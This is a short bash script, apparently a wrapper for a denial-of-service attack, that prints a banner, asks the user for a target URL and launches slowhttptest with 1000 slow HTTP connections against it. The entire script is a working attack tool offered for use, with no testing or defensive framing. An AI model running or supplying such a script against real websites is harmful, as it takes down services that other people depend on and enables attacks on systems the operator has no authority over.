#!/bin/bash

red='\033[32;31m'
nc='\033[0m'
grn='\033[0;32m'
bold='\e[32;1m'
pln='\e[0m'


echo -e "${bold}${red}Denial of attack script started${nc}${pln}"
echo -e "${grn}[*]${nc} Enter the ${grn}url${nc} to attack"
read url;
slowhttptest -c 1000 -B -i 110 -r 200 -s 8192 -t GET -u $url -x 10 -p 3
